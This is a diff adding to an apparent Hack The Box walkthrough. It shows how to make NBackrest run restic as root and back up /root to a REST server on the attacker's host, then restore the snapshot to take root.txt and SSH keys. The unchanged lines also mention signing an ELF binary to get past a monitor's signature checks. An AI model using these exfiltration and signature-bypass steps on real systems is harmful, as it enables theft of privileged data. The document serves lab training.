@@ -151,7 +151,7 @@ int main() {
 
 To bypass signature verification by the monitoring system, we signed the ELF binary using:
 
-🔗 [linux-elf-binary-signer GitHub repository](https://github.com/NUAA-WatchDog/linux-elf-binary-signer)
+[linux-elf-binary-signer GitHub repository](https://github.com/NUAA-WatchDog/linux-elf-binary-signer)
 
 Sign the binary with:
 ```bash
@@ -159,3 +159,65 @@ Sign the binary with:
 ```
 
 This generates a signed ELF executable that passes integrity checks during the scan.
+
+---
+## NBackrest (Restic abuse)
+
+Abuse NBackrest’s ability to run `restic` as **root** to back up `/root` to an attacker-controlled REST backend, then restore locally and grab `root.txt` / SSH keys.
+
+**Rest-server GitHub repository**: [https://github.com/restic/rest-server/](https://github.com/restic/rest-server/)
+
+### Steps to Retrieve `/root`
+
+#### 1) Start a REST backend on the attacker host
+```bash
+# On attacker
+# <ATTACKER_IP> is your HTB/VPN IP; choose a port (e.g., 12345)
+./rest-server --path /tmp/restic-data --listen :12345 --no-auth
+```
+- Stores encrypted repo data under `/tmp/restic-data/<repo_name>`.
+
+#### 2) Configure NBackrest Repository on the target
+In **Add/Edit Restic Repository**:
+- **Repo Name:** anything (e.g., `repo2`)
+- **Repository URI:**  
+  ```
+  rest:http://<ATTACKER_IP>:12345/myrepo2
+  ```
+- **Password:** choose a passphrase (e.g., `123456`) — you’ll need this to decrypt later.
+
+#### 3) Initialize the remote repository
+In NBackrest **Run Command** (for this repo):
+```
+-r rest:http://<ATTACKER_IP>:12345/myrepo2 init
+```
+
+#### 4) Backup `/root` as **root** to your REST repo
+Still in **Run Command**:
+```
+-r rest:http://<ATTACKER_IP>:12345/myrepo2 backup /root
+```
+
+You should see:
+```
+snapshot <ID> saved
+Files: XX new
+Dirs:  XX new
+Added to the repository: X.XXX MiB
+```
+
+#### 5) Restore the loot locally (attacker)
+```bash
+# List snapshots
+restic -r /tmp/restic-data/myrepo2 snapshots
+# enter the same password you set in NBackrest (e.g., 123456)
+
+# Restore
+restic -r /tmp/restic-data/myrepo2 restore <SNAP_ID> --target ./restore
+
+# Get root.txt
+cat ./restore/root/root.txt
+```
+
+---
+
